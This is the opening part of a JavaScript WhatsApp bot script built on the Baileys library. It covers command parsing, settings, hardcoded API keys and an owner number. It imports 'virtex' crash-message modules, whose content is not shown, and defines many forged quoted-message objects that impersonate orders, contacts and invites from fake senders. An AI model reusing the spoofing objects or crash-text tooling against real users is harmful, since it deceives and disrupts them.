// Script by
jack
// 𝙿𝙴𝙿𝙴 𝚂𝙸𝚁 | 𝙳𝙾𝙽'𝚃 𝙲𝙷𝙰𝙽𝙶𝙴 𝙲𝚁𝙴𝙳𝙸𝚃𝚂🙂
// ©jack Bot 
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); 
const { Toxic } = require('./lib/Toxic.js')
const hx = require("hxz-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const yts = require("yt-search");
const ms = require("parse-ms");
const os = require('os');
const toMs = require("ms");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { herodetails } = require('./lib/herodetail.js')
const { herolist } = require('./lib/herolist.js')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage');
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
// BATAS IMAGE FOLDER //
const iye = fs.readFileSync('./stik/thumb.jpeg')
const asw1 = 'https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg'
const sip = fs.readFileSync('./stik/oksip.jpeg')
const bgg = fs.readFileSync('./stik/fake.jpeg')
//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Good night";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Good evening🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Good afternoon🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Good afternoon☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Good morning🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Good night🌃";
    }
 // BATAS \\
menusimpel = false
banChats = false;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = false;
autovn = true;
multi = true
harga = 0
matauang = 'USD'
nopref = false
numbernye = '0'
autoketik = false;
prefixStatus = true;
targetpc = "918943082947"; 
owner = "918943082947"; 
fakeyoi = "jack Sir"; 
HunterApi = "Ikyy69", 
xchillds = 'XChillDs' 
hardi = 'hardianto', 
valkey = "rivalgans", 
zeksapi = "vallganz5",
dapapi = "anakasu",
ApiZeks = "https://api.zeks.xyz",
zeksApikey = "Alphabott",
nomorowner1 = "@918943082947"; 
fake = `𝗢𝘄𝗻𝗲𝗿 : ${fakeyoi}\n❑︎ 𝗣𝗿𝗲𝗳𝗶𝘅 :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
thumb = fs.readFileSync("./stik/thumb.jpeg"); 
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = xeon = async (xeon, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = xeon.user.jid;
    
    const botNumberss = xeon.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await xeon.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await xeon.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await xeon.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await xeon.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await xeon.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await xeon.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = mek.key.fromMe
      ? xeon.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? xeon.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await xeon.chats.all();
    const ownerNumber = [`918943082947@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(xeon, mek);
    const groupMetadata = isGroup ? await xeon.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? xeon.user.jid
      : xeon.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? xeon.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
const daftar1 = `❑ Hi ${pushname} 🐦 ${ucapanWaktu} \n\n❑ Before Using the Bot Verify First 🙂`
       const daftar2 = '```Click the button below to verify bro or type #verify\n𝙿𝙴𝙿𝙴 𝚂𝙸𝚁 😎```'
       const daftar3 = [
          {
            buttonId: `verify`,
            buttonText: {
              displayText: `Verify`,
            },
            type: 1,
          },]
var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[√ VERIFIED]'
			}
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "◩ ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ",
      success: "Success ︎",
      wrongFormat: "Wrong format, try again in the menu",
      error: {
        stick: "not that sticker :v",
        apiz: "error!, maybe because the api key has expired",
        Iv: "The link is error :v",
      },
      only: {
        group: "Only on chat group",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {
      xeon.sendMessage(from, teks, text, { quoted: mek });
    };*/
    const textImg = (teks) => {
           return ikyy.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./xeon.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			xeon.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/918943082947?text=hello`}}})
		}*/
    const sendMess = (hehe, teks) => {
      xeon.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? xeon.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : xeon.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "jack",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./xeon.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `628551000185@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
